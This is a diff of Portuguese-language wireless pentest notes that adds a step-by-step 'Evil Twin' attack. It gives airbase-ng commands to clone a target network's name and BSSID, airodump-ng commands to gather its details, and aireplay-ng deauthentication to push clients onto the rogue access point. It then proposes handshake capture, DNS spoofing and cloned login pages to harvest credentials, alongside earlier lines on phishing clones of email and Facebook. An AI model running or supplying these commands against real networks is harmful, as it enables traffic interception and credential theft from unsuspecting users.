@@ -69,3 +69,31 @@ subnet 10.0.0.0 netmask 255.255.255.0 {
 	-É possivel criar um Web Server, apontando para o IP 10.0.0.1, com clone de paginas de email/facebook/etc
 	-É possivel criar envenenamento de DNS, para apontar essas requisições para a nossa maquina
 		-Usar ettercap na rede at0
+
+
+----
+-Evel Twing
+-Clone de REDES existentes
+	-Nesse caso, sera clonado o nome e bssid da rede ALVO
+	-Os clientes dessa rede irao se desconectar e reconectar na nossa rede
+	
+-São necessaria as informações a seguir:
+	-BSSID, Canal, Cipher, ESSID
+	-Coletar com o airodump-ng
+
+-Clonando a REDE:
+#airbase-ng wlan0mon -c 10 -e <ESSID> -a <BSSID> -Z 4
+	-Z 4 = WPA2/ CCMP (Vide documentação da ferramenta)
+
+-Verificando a rede:
+#airodump-ng wlan0mon -c 10 
+
+-Em outro terminal, realizar desautenticação na rede ALVO
+#aireplay-ng -0 10 -c 10 -a <BSSID> 
+	-Após o ataque, os clientes irao se conectar automaticamente na rede clonada
+
+OBS: Esse ataque pode ser muito efetivo para coletar o handshake da rede, alem de que os clientes irão estar pendurados no nosso roteador
+	-DNS Spoofing
+	-Clone de pagina de autenticação de rede aliada com envenenamento DNS, fazendo com que seja realizado login 
+	-Scan da rede para encontrar alvos vulneraveis
+	
